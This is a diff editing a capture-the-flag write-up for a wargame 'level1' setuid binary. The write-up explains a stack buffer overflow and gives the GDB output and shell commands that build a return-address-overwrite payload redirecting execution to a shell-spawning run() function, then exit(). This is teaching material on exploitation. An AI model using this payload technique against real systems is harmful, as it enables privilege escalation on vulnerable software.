@@ -28,11 +28,15 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
 ```
 
-By calling `find /proc/sys/kernel -name "randomize_va_space" -exec cat {} +`, we discover that [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is disabled.
-
-We also discover that the flag is owned by `level2` and has the `setuid` flag set.
+[ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is disabled on this system.
 ```sh
-ls -la ~/level1
+$ find /proc/sys/kernel -name "randomize_va_space" -exec cat {} +
+0
+```
+
+The binary is owned by `level2` and has the `setuid` flag set.
+```sh
+$ ls -la ~/level1
 -rwsr-s---+ 1 level2 users 5138 Mar  6  2016 /home/user/level1/level1
 ```
 
@@ -54,7 +58,7 @@ In parallel, the kernel and binary do not implement modern security practices *(
 
 ## Vulnerability analysis
 
-We have a **32-bit x86** (elf32-i386) binary containing two user defined functions.
+We have a **32-bit x86** (elf32-i386) binary containing two user defined functions (`main()`, `run()`).
 To perform a **stack overflow** attack, we need to analyze and visualize the program's [**call stack**](https://en.wikipedia.org/wiki/Call_stack). More specifically the target functions **stack frame**.  
 We target the `main()` function.
 
@@ -101,10 +105,8 @@ Notices:
 
 As the kernel's [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) option is disabled, we can use [GDB](https://www.sourceware.org/gdb/) identify the static addresses in a given stack frame.
 ```sh
-$ gdb -ex "start" -ex "info frame" --args ./level1;
-# ...
+$ gdb -batch -ex "start" -ex "info frame" ./level1
 Temporary breakpoint 1 at 0x8048483
-Starting program: /home/user/level1/level1 
 
 Temporary breakpoint 1, 0x08048483 in main ()
 Stack level 0, frame at 0xbffff740:
@@ -113,7 +115,6 @@ Stack level 0, frame at 0xbffff740:
  Locals at 0xbffff738, Previous frame's sp is 0xbffff740
  Saved registers:
   ebp at 0xbffff738, eip at 0xbffff73c
-# ...
 ```
 
 After the additional analysis of the [source.asm](./source.asm) file,  
@@ -144,14 +145,14 @@ By overwriting the **Return Address**, we can hijack the program's control flow 
 
 We wish to execute commands such as `system("/bin/sh")` or `execve("/bin/sh", NULL, NULL)` to spawn a new shell that inherits the EUID *(level2)* of the process.
 
-The `run()` function available in the binary calls `system("/bin/sh")` for us. It's stack frame starts at the following address: `0x08048444` (or `\x44\x84\x04\x08` in **little-endian hexadecimal byte escaped format**).
+The `run()` function available in the binary calls `system("/bin/sh")` for us. It's stack frame starts at the following address: `0x08048444` (or `\x44\x84\x04\x08` in **little-endian hexadecimal byte escaped format** or `\104\204\004\010` in **little-endian octal byte escaped format**).
 
 ```sh
 $ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
 $ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
-$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
 $ payload="${local_vars_filler}${ebp_filler}${run_retaddr}";
-$ (echo -ne "$payload\n") | ~/level1
+$ (printf "%b" "$payload\n") | ~/level1
 Good... Wait what?
 Segmentation fault (core dumped)
 ```
@@ -177,17 +178,22 @@ Since `run()` was not invoked via a `CALL` instruction, the stack lacks the stan
 ```
 
 ```sh
-$ gdb -ex "start" -ex "p exit" ./level1
-$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit> # <=> \xe0\xeb\xe5\xb7
+$ gdb -batch -ex "start" -ex "p exit" ./level1
+Temporary breakpoint 1 at 0x8048483
+
+Temporary breakpoint 1, 0x08048483 in main ()
+$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+# hexadecimal => \xe0\xeb\xe5\xb7
+# octal => \340\353\345\267
 ```
 
 ```sh
 $ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
 $ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
-$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
-$ exit_retaddr="$(printf "\xe0\xeb\xe5\xb7")"; # `run()`s Return address, set to `exit()` = 4 bytes.
+$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ exit_retaddr="$(printf "%s" "\340\353\345\267")"; # `run()`s Return address, set to `exit()` = 4 bytes.
 $ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
-$ (echo -ne "$payload\n") | ~/level1
+$ (printf "%b" "$payload\n") | ~/level1
 Good... Wait what?
 ```
 
@@ -199,10 +205,10 @@ To prevent this, we must keep the input stream's write end open for the lifetime
 ```sh
 $ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
 $ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
-$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
-$ exit_retaddr="$(printf "\xe0\xeb\xe5\xb7")"; # `run()`s Return address, set to `exit()` = 4 bytes.
+$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ exit_retaddr="$(printf "%s" "\340\353\345\267")"; # `run()`s Return address, set to `exit()` = 4 bytes.
 $ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
-$ (echo -ne "$payload\n"; cat -) | ~/level1
+$ (printf "%b" "$payload\n"; cat -) | ~/level1
 Good... Wait what?
 ```
 
